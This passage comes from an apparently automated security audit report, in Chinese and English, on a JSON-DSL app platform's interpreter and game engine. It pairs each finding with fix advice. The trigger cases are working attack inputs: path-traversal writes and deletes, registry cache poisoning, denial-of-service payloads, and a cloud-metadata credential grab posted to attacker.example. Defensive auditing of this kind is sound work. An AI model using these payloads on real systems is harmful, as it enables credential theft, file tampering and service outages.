JSON App config: {"dsl":"3.3","appid":"...","dependencies":{"../../../../../../tmp/pwned":"^1.0.0"}}. On loadDependencies -> _loadDependency -> CacheManager.getResource("../../../../../../tmp/pwned", ^1.0.0). The fixed registry at RegistryConfig.registryUrl/resolve?name=../../../../../../tmp/pwned&version=^1.0.0 is queried; if it (or a compromised/malicious registry) returns {"download_url":"<any>","version":"1.0.0"}, the downloaded config is written to $_cacheDir/packages/../../../../../../tmp/pwned/1.0.0.json (createSync recursive, no containment) escaping the cache dir. The filename component is independently steerable via the registry response field version (e.g. version="../../evil").
```

**影响**：Arbitrary file write outside the app cache directory on native platforms (iOS/Android/desktop): overwrite other apps' cached JSON (cache poisoning of a different app's dependency), drop files into other app-readable locations, or clobber the index/other cache entries. Combined with the fact cached content is later loaded and executed as DSL, this enables cross-app cache poisoning.

**修复建议**：Sanitize/validate `name` and `resolvedVersionStr` before using them in a path: reject any value containing '/', '\\', '..', or leading '.'; or derive the on-disk filename from a hash (sha256 of name+version) like AssetCache does. Additionally canonicalize the final path and assert it is still under _cacheDir before writing.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and I traced it end-to-end. Untrusted dependency name flows unsanitized into the on-disk path: dependency_loader.dart:129-130 builds DependencySpec.fromJson(entry.key, ...) directly from the JSON App's `dependencies` map keys (no validation in fromJson, lines 54-94), passes spec.name into CacheManager.getResource at 165-168, which reaches _downloadAndCacheResource. There at cache_manager.dart:230-231 the path is built by raw interpolation: relPath = '${type=="app"?"apps":"packages"}/$name/$resolvedVersionStr.json', and written via NativeFs.writeStringAbs('$_cacheDir/$relPath', ...) at 232-234. resolvedVersionStr comes from data['version'] of the registry resolve response (l。…

</details>

---

#### `H11` — @my_apps_share writes attacker-controlled fileName into temp dir with no sanitization — path traversal write

**类别**：宿主访问 · **边界**：D · **置信度**：high  
**位置**：`lib/json_ui/builtins/launcher_bridges.dart:123-153`

**机制**：_myAppsShare takes args['fileName'] verbatim and builds tempPath = '$tmp/$fileName' (line 141) then NativeFs.writeStringAbs(tempPath, ...). writeStringAbs (native_fs_io.dart:67-76) calls File(absPath) and auto-creates parent directories (createSync(recursive:true)). fileName is never validated for '..' or absolute paths. AppStorage.load() (app_storage.dart:146-152) likewise reads '$dir/$fileName' with no sanitization, so the config content written is itself read from a path the attacker also controls. Combined: a JSON app can request sharing of a file outside the apps dir, and write JSON to an arbitrary host path.

**触发用例**：

```
Delete (cleanest, unconstrained): {"call":"@my_apps_delete","args":{"fileName":"../../../../some/host/file"}} → deleteAbs('$docs/my_apps/../../../../some/host/file') deletes an arbitrary host file. Read/launch: {"call":"@launch_app","args":{"kind":"local","fileName":"../../../../path/to/other_app.json"}} reads & runs any JSON outside my_apps. Share (write is gated by a successful traversed read): {"call":"@my_apps_share","args":{"fileName":"../../../target.json"}} reads '$docs/my_apps/../../../target.json' and re-encodes it to '$tmp/../../../target.json', creating parent dirs.
```

**影响**：Arbitrary file write (and read via load) outside the sandboxed app-docs directory, on a path the untrusted JSON chooses; can drop files into config/launch directories, overwrite host files, or read sibling apps' configs.

**修复建议**：Reject fileName containing '/', '\\', '..', or leading separators in all my_apps_* and launch_app local paths; resolve and assert the canonical path stays within the apps/temp dir before any read/write/delete.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and untrusted JSON reaches the sink with no sanitization anywhere along the path. Traced full chain: untrusted action {"call":"@my_apps_*"/"@launch_app","args":{"fileName":...}} → interpreter.dart:1228 _executeCall → _resolveArgs (resolves attacker template into fileName, no validation) → default branch interpreter.dart:2834-2841 → LauncherBridges.tryDispatch → handlers. No _requiresLoggedIn gate covers these calls (interpreter.dart:3162-3171 only gates @im_/@refresh_user/@update_profile/@upload_avatar), no allowlist.

Confirmed sinks (all in launcher_bridges.dart, all using verbatim '$dir/$fileName' or '$tmp/$fileName'):
- _myAppsShare (line 124,130,141-142): load('$dir/$f。…

</details>

---

#### `H12` — No URL scheme/host allowlist — full SSRF to loopback, internal hosts, and cloud metadata

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：high  
**位置**：`lib/json_ui/http_client.dart:26-35, 39-56, 60-80, 145-158, 161-176`

**机制**：_resolveUrl performs zero validation: if the URL has any scheme it is passed verbatim to dio (line 30: `if (uri != null && uri.hasScheme) return url;`). The interpreter (_builtinHttpGet/Post/Put/Delete/Patch/Head/Options at interpreter.dart:2965-3030) takes `args['url']` directly from untrusted JSON. There is no allowlist of hosts/schemes, no block on loopback (127.0.0.1, ::1, localhost), link-local (169.254.169.254 cloud metadata), RFC1918/private ranges, or non-HTTP schemes. The platform's whole promise is a capability boundary, but @http_get is an unconstrained outbound request primitive.

**触发用例**：

```
Startup/step in any untrusted JSON App: [{"call":"@http_get","args":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"},"assign":"global.creds"},{"call":"@http_post","args":{"url":"https://attacker.example/x","body":{"{{ global.creds.data }}":1}}}]. On a desktop client co-located with App MinIO, swap the first URL to http://127.0.0.1:9000/. dio fires both verbatim; response body is returned in the result map and exfiltrated by the second call. (Note: on Web, CORS prevents reading the cross-origin response body, limiting exfil to platforms without that restriction.)
```

**影响**：Untrusted JSON can use the victim's client (and its network position) to reach internal services, cloud-metadata endpoints, and loopback admin interfaces, then ship the results to an attacker host — classic SSRF + data exfiltration entirely within the supposedly-sandboxed JSON capability boundary.

**修复建议**：Add a scheme allowlist (http/https only) and a host denylist in _resolveUrl: reject loopback, link-local (169.254.0.0/16, fd00::/8), private ranges, and `*.local`. Optionally gate non-backend hosts behind an explicit per-app permission. Resolve and re-check the host after DNS to defeat rebinding where feasible.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable as described. _resolveUrl (http_client.dart:26-35) does zero validation: if the parsed URI has a scheme it is returned verbatim (line 30) and handed to dio (get/post/put/delete/patch/head/options at lines 45-176). The interpreter feeds args['url'] straight from untrusted JSON into these methods (_builtinHttpGet at interpreter.dart:2968-2971, and siblings 2974-3004 confirmed). I verified via grep that there is NO scheme allowlist, host denylist, loopback/link-local/RFC1918 check, custom HttpClientAdapter, or redirect cap anywhere in lib/json_ui or lib/platform. dio uses default settings (http/https accepted, redirects followed). So a JSON App step {"call":"@htt。…

</details>

---

#### `H13` — @delay continuation mutates parent-app state and notifies after child app is popped (cross-app state corruption + race)

**类别**：状态破坏 · **边界**：E · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:1347-1352 (Future.delayed), 826-839 (setVariable), 665-712 (popState)`

**机制**：The single-interpreter architecture multiplexes parent and child JSON-Apps via pushState()/popState() that swap _config/_variables/_functions in place (lines 704-706). @delay does a bare `await Future.delayed(Duration(milliseconds: ms))` (line 1351) inside an action chain that NO collection tracks. There is no _timers/_subscriptions set, and popState() (lines 665-712) cancels only _imInboxSub, _textControllers and _focusNodes — it never cancels pending Future.delayed continuations or in-flight _executeStep chains. When a child app launched via @launch_app (launcher_bridges.dart:311 pushState, :337-340 popState wired into route.whenComplete) schedules an action like [@delay, @set global.x], and the user navigates back before the delay elapses, popState swaps _variables back to the PARENT. The delay then resolves, the continuation calls setVariable (lines 826-839) which writes into the now-parent _variables via _setNestedValue and calls notifyListeners(), corrupting parent state and forcing an unexpected parent rebuild. setVariable has no app-identity/epoch guard.

**触发用例**：

```
Launcher app A does @launch_app to child app B (or B is loaded via kind:market/local). B has a button whose action is: {"type":"call","call":"@delay","args":{"ms":5000}} followed (in the same action list / a @parallel) by {"type":"call","call":"@set","args":{"var":"global.score","value":999}}. User taps the button in B, immediately presses back (route pops → popState restores A). 5s later the @set runs against A's _variables: A.global.score becomes 999 and A's UI rebuilds.
```

**影响**：One untrusted app silently writes arbitrary keys into another app's runtime variable tree and triggers its rebuild — breaks the per-app isolation promise of the capability boundary. Can overwrite parent auth/session-derived variables or inject attacker-controlled values that parent screens render.

**修复建议**：Introduce a monotonically increasing app-epoch (or generation token) set in loadConfig/pushState/popState. Capture the epoch when an action/step chain starts; in setVariable and notifyListeners-emitting paths bail out (or route the write to the correct snapshot) if the current epoch no longer matches. Alternatively track all pending Future.delayed via a CancelableOperation/Timer set per epoch and cancel them in popState/loadConfig.

<details><summary>对抗验证者核验结论</summary>

Traced untrusted input to impact across all hops:

1. @delay sink (interpreter.dart:1347-1352) is a bare `await Future.delayed(Duration(milliseconds: ms))` with no Timer/Future tracking. No _timers/_subscriptions/CancelableOperation set exists; grep for epoch/generation/pendingTimers returns nothing.

2. Sequencing is real and reachable from untrusted JSON. _executeCall dispatches @if/@while/@for_each/@try_catch (1256-1267) whose bodies are action arrays awaited sequentially, and custom @global.funcName bodies run steps sequentially via _executeStep (1858-2860 region). So a JSON-App can place [@delay, @set] in one awaited chain — the delay suspends before the @set runs.

3. setVariable (826-。…

</details>

---

#### `H14` — Division-by-zero with attacker tilewidth/tileheight = 0 crashes collision & render loops (UnsupportedError on Infinity.floor())

**类别**：类型/崩溃 · **边界**：B · **置信度**：high  
**位置**：`lib/games/tiled_map_entity.dart:232-251, 560-587`

**机制**：mapWidth/mapHeight/tileWidth/tileHeight are read straight from untrusted JSON/TMX (lines 96-99, 128-131) with no validation that they are positive. In collisionRectsIn() (line 232: `tw = tileWidth * scale`, line 233: `th = tileHeight * scale`) and _renderLayer() (line 560-561) these become the divisor in expressions like `((area.left - layer.offsetX) / tw).floor().clamp(...)`. If tileWidth or tileHeight is 0, tw/th is 0.0 and the division yields double.infinity (or NaN if area is also non-finite). Dart's `double.infinity.floor()` / `.ceil()` / NaN.floor() throw `UnsupportedError: Infinity or NaN toInt`. Unlike load() (lines 86-90) which is wrapped in try/catch, collisionRectsIn() and _renderLayer() are invoked every frame from the physics/render loop and are NOT guarded, so the exception escapes into the game loop.

**触发用例**：

```
Load a JSON map with `{"width":10,"height":10,"tilewidth":0,"tileheight":64,"layers":[{"type":"tilelayer","width":10,"height":10,"data":[1,1,...]}],"tilesets":[{"firstgid":1,"image":"x.png","tilewidth":1,"tileheight":1,"tilecount":1,"columns":1}]}`. As soon as the first frame renders (_renderLayer) or the player queries collisionRectsIn, `(... / 0.0).floor()` throws UnsupportedError and the game crashes.
```

**影响**：Untrusted map data crashes the client render/physics frame (white screen / repeated exceptions). Persistent DoS for any user who opens the JSON App.

**修复建议**：After reading dimensions in _loadFromJson/_loadFromTmx, clamp/validate: reject or sanitize tileWidth/tileHeight to >=1 (e.g. `tileWidth = _intValue(...).clamp(1, maxTile)`), and similarly guard tw/th in collisionRectsIn/_renderLayer before dividing.

<details><summary>对抗验证者核验结论</summary>

The finding is accurate and I could not refute it.

MECHANISM IS REAL:
- tileWidth/tileHeight are read from fully attacker-controlled JSON at /home/fish/ai-app/lib/games/tiled_map_entity.dart:130-131 (`tileWidth = _intValue(data['tilewidth'] ?? data['tileWidth'], 64)`) and TMX at :98-99. _intValue (:907-911) returns the raw int with NO clamp — it will happily return 0. Contrast with `columns` at :725/:823 which DOES `.clamp(1, 1<<30)`, confirming the omission is real, not guarded elsewhere.
- scale defaults to 1 (:47). So `tw = tileWidth * scale` (:232, :560) becomes 0.0 when tilewidth=0.
- In Dart, `finite / 0.0 == double.infinity`, and `double.infinity.floor()` throws `UnsupportedError: In。…

</details>

---

### 中危 (Medium)

#### `M1` — Cached/registry dependency JSON loaded and executed with no integrity or signature check

**类别**：设计缺陷 · **边界**：A · **置信度**：high · **原始/校准严重度**：high → medium  
**位置**：`lib/json_ui/dependency_loader.dart:163-226`

**机制**：Dependencies are resolved by name via the registry resolve endpoint (cache_manager.dart:154-155) and the resulting download_url (cache_manager.dart:174,207) is fetched and its JSON config is registered as a LoadedModule whose `functions`, `screens`, `templates`, and `variables` are exposed to the running app (findFunction/findScreen/findTemplate at dependency_loader.dart:235-294). There is no hash pinning, no signature verification, and no allow-list of download hosts: the download_url returned by /resolve is fetched verbatim by DslHttpClient.get with no scheme/host restriction. The declared semver constraint is only checked against meta['version'] *inside the downloaded payload* (dependency_loader.dart:183), which the payload controls — so version pinning provides no integrity guarantee.

**触发用例**：

```
JSON App declares "dependencies": { "common-ui": "^1.0.0" }. DependencyLoader.loadDependencies -> _loadDependency calls CacheManager.getResource -> _downloadAndCacheResource (cache_manager.dart:147). That hits REGISTRY_URL/resolve, reads data['download_url'] (line 174), and fetches it verbatim via _httpClient.get(downloadUrl) (line 207). http_client.dart _resolveUrl (lines 26-35) imposes NO scheme/host allow-list: any absolute URL (incl. http://internal-host or attacker.example) passes straight to dio (which also follows redirects by default). The downloaded JSON's global.functions/variables, ui.screens, ui.templates are registered as a LoadedModule (dependency_loader.dart:198-216) and exposed via findFunction/findScreen/findTemplate. The semver constraint (dependency_loader.dart:183) is validated only against meta.version INSIDE the downloaded payload, which the payload controls, so an attacker who controls the registry response or MITMs it just sets meta.version to a satisfying value. Net effect: attacker-supplied DSL is fetched (with no integrity/signature/host check) and registered/executed. NOTE: the injected content is DSL (funcDef = {params, logic} run through _executeFunctionDef/_executeStep, interpreter.dart:3640-3672) — it runs within the SAME precompiled capability boundary as the top-level app, NOT native code.
```

**影响**：Supply-chain code injection within the DSL boundary: an attacker who controls the registry response or any declared dependency's served content can inject arbitrary functions/UI into a victim app that merely depends on a library by name. No tampering is detected.

**修复建议**：Require integrity metadata in the dependency declaration (e.g. an expected sha256 of the resolved JSON, like an npm lockfile integrity hash) and verify it after download before registering. Restrict download_url to an allow-list of trusted hosts (the registry/object-storage domain). Do not trust payload-embedded meta.version for the constraint check without binding it to the registry's signed resolution.

<details><summary>对抗验证者核验结论</summary>

Every code claim in the finding is factually accurate and I traced them all: (1) cache_manager.dart:154-156 resolves via /resolve, :174 reads download_url, :207 fetches it verbatim; (2) http_client.dart:26-35 _resolveUrl applies no scheme/host restriction; (3) dependency_loader.dart:178-189 validates the semver constraint only against the payload-embedded meta.version, so version pinning provides zero integrity; (4) there is no sha256/signature/lockfile check anywhere before registering the LoadedModule (dependency_loader.dart:198-216); (5) the registered functions/screens/templates are reachable via findFunction/findScreen/findTemplate and actually invoked (interpreter.dart:1300-1306, 1175,。…

</details>

---

#### `M2` — @animated_sprite.effect auto-generates a unique entity id every call → unbounded entity growth DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/games/game_actions.dart:1465-1497`

**机制**：When no id is supplied, the effect entity id defaults to 'effect_${DateTime.now().microsecondsSinceEpoch}', i.e. a fresh unique id per call. spawnEntity has no global entity-count cap (flame_game_engine.dart:372-382). Although effects are spawned with removeOnFinish:true, an attacker can set frames/step_time so the animation is very long (or loop indirectly) and spam @animated_sprite.effect every frame, growing the entities map far faster than entities expire. Every frame also pays O(entities) cost in update() and an O(n log n) sort in render(), so growth compounds into per-frame slowdown.

**触发用例**：

```
"frame": { "logic": [ { "call": "@animated_sprite.effect", "args": { "asset": "x.png", "position": [0,0], "frames": 100000, "step_time": 100 } } ] } — long-lived effects accumulate without bound.
```

**影响**：Unbounded entity map growth -> rising per-frame cost and eventual OOM; client slows to a halt.

**修复建议**：Enforce a global max entity count in spawnEntity (reject beyond N) and cap effect lifetime independent of author-supplied frames/step_time.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and fully reachable from untrusted JSON. Traced end-to-end:

1. `frame.logic` is parsed directly from the untrusted game spec (flame_game_engine.dart:432-433) and executed EVERY update() tick (line 171-176). This is attacker-controlled per-frame code.

2. `@animated_sprite.effect` is dispatchable from logic (game_actions.dart:558-561) → `_spawnAnimationEffect` (1461-1498).

3. With no `id` arg, a fresh unique id `effect_${microsecondsSinceEpoch}` is generated per call (1465-1467), so spawnEntity's only dedup guard — `if (entities.containsKey(id)) return false;` (flame_game_engine.dart:373) — never fires.

4. spawnEntity (372-382) has NO global entity-count cap. The reviewer。…

</details>

---

#### `M3` — One-shot @audio.play creates a fresh AudioPlayer per call with no concurrency cap — playback flood

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_audio.dart:44-52`

**机制**：For non-looping playback, play() unconditionally allocates a new AudioPlayer(), adds it to _oneShotPlayers, and only removes/disposes it on onPlayerComplete. There is no cap on simultaneous one-shot players. Called from per-frame logic, this allocates a new native player every frame; if the source is long or fails slowly, players pile up. With an attacker http URL source that hangs, completion never fires and players are retained.

**触发用例**：

```
"frame": { "logic": [ { "call": "@audio.play", "args": { "source": "https://attacker.example/never-ends.mp3", "loop": false } } ] } executed 60x/sec.
```

**影响**：Concurrent player flood -> audio subsystem / memory exhaustion; degraded or frozen audio.

**修复建议**：Cap concurrent one-shot players (drop new plays or recycle oldest beyond N), and add a max lifetime/timeout that disposes players that never complete.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable from untrusted JSON, and no guard neutralizes it.

CODE TRACE:
- /home/fish/ai-app/lib/games/game_audio.dart:44-52 — one-shot play() unconditionally does `final player = AudioPlayer(); _oneShotPlayers.add(player);` and only removes/disposes on `onPlayerComplete`. `_oneShotPlayers` (line 14) is an unbounded `Set<AudioPlayer>`. There is NO concurrency cap, NO de-dup of an already-playing source, and NO max-lifetime/timeout disposal. The only cleanup paths are onPlayerComplete (line 46-49), explicit @audio.stop (line 60-64), play-failure (line 180-181), and dispose (line 116-119).
- A URL source not present in the catalog yields `_AudioSpec(source: idOrSource。…

</details>

---

#### `M4` — GameWorld unbounded cols/rows enables allocation/compute DoS in grid renderers

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_world.dart:39-40, 63-64`

**机制**：cols/rows are taken directly from attacker JSON with no upper bound (lines 39-40). Grid-drawing consumers iterate over the full grid: game_entity.dart:815-847 computes cellSize = world.width/cols and loops cols*rows cells drawing a rect each frame. A spec with cols:1000000 rows:1000000 forces a ~10^12-iteration render loop per frame, freezing the UI thread. inGrid (lines 63-64) and any per-cell logic scale with cols*rows as well.

**触发用例**：

```
flame_game widget with world that has unbounded cols/rows. Two real world-driven sinks (the finding's cited sink at game_entity.dart:815-847 is misattributed — ValueGridEntity.render loops over the ENTITY's own cols/rows + a backing `cells` array, not world.cols/world.rows):\n\n(1) Per-frame render DoS: {"type":"flame_game","spec":{"world":{"kind":"grid","cols":100000,"rows":100000,"grid_lines":"#FFFFFF"}}}. flame_game_engine.dart:210-211 calls _drawGridLines every frame when kind=='grid' && gridLines!=null; _drawGridLines (lines 1067-1080) issues cols+rows (~200k) canvas.drawLine calls per frame, freezing the render thread.\n\n(2) Worse allocation/compute DoS via a grid action: the random-free-cell action in game_actions.dart:390-395 runs a nested `for x<gameWorld.cols { for y<gameWorld.rows }` loop with an O(n) excludeCells.any inside, building a free-cell list. With cols=rows=100000 this is ~10^10 iterations plus a ~10^10-element list allocation -> OOM/ANR. Triggered by invoking that game action from untrusted JSON; no grid_lines needed.\n\nAlso the value_grid entity factory (flame_game_engine.dart:583-601) eagerly allocates a rows*cols int matrix from spec cols/rows (entity-level, separate from world but same unbounded pattern).
```

**影响**：Untrusted JSON freezes/ANRs the client (denial of service) with no memory cap; pure config, no user interaction beyond opening the app.

**修复建议**：Clamp cols/rows to a documented maximum (e.g. 1..1024) in fromJson, and/or cap the number of cells iterated by grid renderers; reject specs exceeding the cap rather than silently looping.

<details><summary>对抗验证者核验结论</summary>

The finding's core claim is real and triggerable: GameWorld.fromJson (game_world.dart:39-40) takes cols/rows directly from untrusted JSON with no upper bound, and multiple consumers loop/allocate proportional to cols*rows. I confirmed two genuine world-driven sinks: _drawGridLines (flame_game_engine.dart:1063-1081, called every frame at line 210-211 when kind=='grid' and grid_lines is set) draws cols+rows lines per frame; and the grid random-free-cell action (game_actions.dart:390-395) runs a cols*rows nested loop with an inner O(n) scan plus a cols*rows list allocation, an outright OOM path. The unbounded source the finding cites (game_world.dart:39-40) is accurate.\n\nHowever the SPECIFIC 。…

</details>

---

#### `M5` — Unbounded SSE buffer growth — memory-exhaustion DoS from a malicious stream

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/http_client.dart:222, 237-259`

**机制**：In sse(), receiveTimeout is raised to 10 minutes (line 222) and the response body is consumed chunk-by-chunk into a String `buffer` that only ever shrinks when a `\n\n` event delimiter is found (line 242-245). A server (which is attacker-controlled in this threat model — the JSON App chooses the URL) can stream gigabytes of bytes that contain no `\n\n`, causing `buffer` to grow without bound. There is no maximum-buffer / maximum-total-bytes cap, and all decoded text is also accumulated into the `events` list which is returned and bound into a DSL variable.

**触发用例**：

```
{"call":"@http_sse","args":{"url":"https://attacker.example/flood","method":"GET","bind":"global.s"}} — the attacker-controlled server replies with Content-Type text/event-stream and streams an endless single line of bytes containing NO blank-line (\n\n) separator. In sse() (http_client.dart:237-259) every chunk is appended to `buffer` via `buffer += utf8.decode(...)`, and `buffer` only shrinks when a \n\n delimiter is found (lines 242-245). With no delimiter the String grows without bound until OOM. Note: Dio's receiveTimeout (10 min, line 222) is an inactivity timeout reset on every received chunk, so a server that keeps trickling bytes never trips it — the attacker effectively has unlimited time, so the trigger is stronger than the reviewer's "for 10 minutes" framing. A second variant: a server that DOES emit \n\n delimiters but emits millions of tiny events grows the `events` list (line 191/248) unbounded, which is then bound into a DSL variable at interpreter.dart:3092.
```

**影响**：Client memory grows until OOM / app crash — a single malicious JSON App (or any SSE endpoint it points at) can DoS the precompiled client.

**修复建议**：Cap the accumulated `buffer` length and abort the stream (throw/return error) when a single event block exceeds a sane limit (e.g. 1 MB) and when total received bytes exceed a ceiling. Also cap the `events` list size.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified by reading http_client.dart:183-292 and the call path in interpreter.dart:1585 / 3032-3116. sse() consumes responseBody.stream chunk-by-chunk into a String `buffer` (line 237-239) that only shrinks on a \n\n delimiter (242-245); with no delimiter it grows unbounded. The `events` list (191, 248) also grows monotonically and is returned/bound into a DSL variable (interpreter.dart:3092). I searched for any cap (maxResponseContentLength, contentLength, buffer/events length checks) in the whole file and the BaseOptions constructor (lines 16-24) — none exists. The URL is fully attacker-controlled: it comes straight from args['url'] (interpreter.dart:3036) with no allowlist, and 。…

</details>

---

#### `M6` — @str_repeat / @str_pad / @str_mask allow unbounded string allocation (memory DoS)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:2209-2229, 2271-2279`

**机制**：@str_repeat returns `str * count` with count taken straight from args via _toInt and no clamp; @str_pad builds `padStr * ((padCount/padStr.length).ceil())` from an attacker `length`; @str_mask builds `maskChar * (e-s)`. Dart String multiplication eagerly allocates the full result. A large count/length forces a multi-gigabyte allocation that OOM-kills or freezes the isolate. count/length can also come from a template fed by an HTTP response.

**触发用例**：

```
{"call":"@str_repeat","args":{"value":"AAAAAAAA","count":2000000000}} and {"call":"@str_pad","args":{"value":"x","length":2000000000}} both work as written. The @str_mask case named in the finding is NOT exploitable because start/end are clamped to str.length (lines 2277-2278); drop it from the finding.
```

**影响**：Out-of-memory / unresponsive client triggered purely from untrusted JSON config.

**修复建议**：Clamp count/targetLength to a hard maximum (e.g. 1<<20) before multiplying, and short-circuit when the requested length exceeds it.

<details><summary>对抗验证者核验结论</summary>

Verified the cited code in /home/fish/ai-app/lib/json_ui/interpreter.dart.

CONFIRMED for two of the three named functions:
- @str_repeat (lines 2209-2212): `final count = _toInt(resolvedArgs['count'] ?? 0); return str * count;` — count comes straight from JSON args via _toInt (line 3756-3761), which passes arbitrary large ints through with no clamp. Dart String `*` allocates eagerly, so count=2000000000 on an 8-char value attempts a ~16GB allocation.
- @str_pad (lines 2220-2229): `targetLength = _toInt(resolvedArgs['length'] ?? 0)` is uncapped; it builds `padStr * ((padCount / padStr.length).ceil())` then `.substring(0, padCount)`, eagerly allocating ~targetLength chars. length=2000000000 t。…

</details>

---

#### `M7` — @while iteration cap is author-controlled, so it is not a real DoS guard

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:2866-2883 (_builtinWhile)`

**机制**：`maxIterations` is read from the same untrusted args (`args['max_iterations'] ?? 10000`). The threat model says JSON is adversarial, so the attacker simply sets max_iterations to 1e18 (or omits a terminating condition and sets a huge cap). The cap only protects against accidental infinite loops by honest authors, not against a malicious app. Combined with synchronous-only bodies it freezes the event loop.

**触发用例**：

```
{ "call": "@while", "args": { "condition": true, "max_iterations": 1000000000000, "body": [ { "call": "@set", "args": { "var": "global.n", "value": 1 } } ] } }
```

**影响**：Client hang / DoS; the existing cap gives a false sense of safety.

**修复建议**：Enforce a framework-level hard ceiling (min(authorCap, HARD_MAX)) and a wall-clock / step budget that aborts long-running control flow regardless of the author-supplied limit.

<details><summary>对抗验证者核验结论</summary>

Verified against the actual code at /home/fish/ai-app/lib/json_ui/interpreter.dart:2866-2883 (_builtinWhile). The mechanism is real and reachable, and the reviewer did not misread.

(1) Mechanism: maxIterations = _toInt(_resolveTemplatesInRule(args['max_iterations']) ?? 10000) (line 2869-2871). It is read directly from the untrusted args with NO framework-level hard ceiling. _toInt (line 3756) returns Dart 64-bit ints unchanged, so max_iterations:1000000000000 is honored verbatim. The loop condition is while(_evaluateBool(condition) && count < maxIterations) — the only bound is the attacker-controlled cap.

(2) No missed guard: grep for HARD_MAX / step budget / wall-clock / maxSteps / Timeou。…

</details>

---

#### `M8` — Unbounded recursion via @global function calls has no depth guard → stack overflow DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/json_ui/interpreter.dart:3627-3672 (_executeFunctionDef / _executeGlobalFunction), _executeCall 1248`

**机制**：The DSL advertises recursion (§1: 图灵完备 … 递归). A global function whose logic calls @global.<itself> recurses through _executeCall → _executeFunctionDef with only _paramsStack.add/removeLast and no recursion-depth or step-count cap. @while is bounded by max_iterations, but recursion through custom functions (and mutual recursion A→B→A) is entirely unbounded.

**触发用例**：

```
Startup config: {"global":{"functions":{"f":{"params":[],"logic":[{"call":"@global.f"}]}}},"steps":[{"call":"@global.f"}]}. At loadConfig, _executeStepsInternal (line 733-737) runs the step → _executeStep (1222) → _executeCall (1228) → matches @global. prefix (1288) → _executeGlobalFunction (3627) → _executeFunctionDef (3649) → loops over logic, _executeStep on {"call":"@global.f"} → recurses with no depth counter. Mutual recursion (f calls @global.g, g calls @global.f) is equally unbounded. Each level does _paramsStack.add (3660) and never reaches removeLast (3670), so _paramsStack grows without bound.
```

**影响**：Untrusted JSON crashes the client (StackOverflowError, possibly not catchable cleanly), a denial of service inside the precompiled boundary. Each level also grows _paramsStack.

**修复建议**：Track a call/recursion depth counter on the interpreter and throw a catchable framework error (routable via @try_catch / onActionCrash) past a configurable limit; document the limit alongside @while's max_iterations.

<details><summary>对抗验证者核验结论</summary>

Mechanism verified by reading the actual code. _executeFunctionDef (lib/json_ui/interpreter.dart:3649-3672) executes each logic step via _executeStep, and _executeCall (1248) routes @global.<name> back into _executeGlobalFunction → _executeFunctionDef with no recursion-depth or step-count counter anywhere in the file (grep confirms only _paramsStack add/removeLast and _builtinWhile's maxIterations). Untrusted JSON fully controls global.functions and the startup steps array, so the path from untrusted input to impact is directly reachable. One correction to the reviewer's impact wording: in Dart a bare `catch (e)` DOES catch StackOverflowError (it is an Error, and bare catch catches all Objec。…

</details>

---

#### `M9` — @delay accepts unbounded/attacker-controlled duration with no cap and no cancellation (resource/handle exhaustion)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:1347-1352`

**机制**：@delay reads `ms` from resolvedArgs and passes it straight to Future.delayed (line 1351) with no upper bound, no minimum, and no tracking/cancellation. ms is _toInt'd from untrusted JSON or an HTTP response. Combined with the loop builtins (@loop_by_num count is _toInt of untrusted args with NO cap — _builtinLoopByNum line 2906-2919, unlike @while which caps at 10000 line 2869) or @parallel (line 2951-2960 spawns one future per step with no cap), untrusted JSON can schedule a very large number of long-lived pending timers, each holding a captured continuation closure referencing the interpreter.

**触发用例**：

```
Steps: {"type":"call","call":"@loop_by_num","args":{"count":100000,"body":[{"type":"call","call":"@parallel","args":{"steps":[{"call":"@delay","args":{"ms":2147483647}}]}}]}}. Or a single {"call":"@delay","args":{"ms":2147483647}} that pins the start-steps execution (and any awaiting caller) effectively forever.
```

**影响**：Memory/timer-handle accumulation and an effectively un-cancellable hang of the step pipeline; pending closures retain interpreter state preventing GC. Feeds directly into the cross-app and post-dispose races above (the longer the delay, the wider the window).

**修复建议**：Clamp ms to a sane maximum (e.g. <= 60_000) and minimum 0; cap @loop_by_num count and @parallel fan-out; register the resulting Timer/Future in a per-epoch collection that loadConfig/popState/dispose cancels.

<details><summary>对抗验证者核验结论</summary>

All four mechanistic claims verified against the real code:\n\n1. @delay (interpreter.dart:1347-1352): ms = _toInt(resolvedArgs['ms'] ?? resolvedArgs['milliseconds'] ?? 0) then `await Future.delayed(Duration(milliseconds: ms))`. No upper/lower clamp, no Timer/Future tracking. Confirmed.\n\n2. @loop_by_num (_builtinLoopByNum, 2906-2922): count = _toInt(_resolveTemplatesInRule(args['count']) ?? 0), loops `for (var i=0; i<count; i++)` with NO cap. This contrasts directly with _builtinWhile (2866-2882) which caps maxIterations default 10000 at line 2869-2871. Confirmed asymmetry.\n\n3. @parallel (_builtinParallel, 2951-2961): builds one Future per step via _executeStep with no fan-out cap, then 。…

</details>

---

#### `M10` — BackdropFilter / ImageFiltered accept unbounded blur sigma (GPU/CPU exhaustion DoS)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/widgets/visual_primitives_widget.dart:21-28, 49-52`

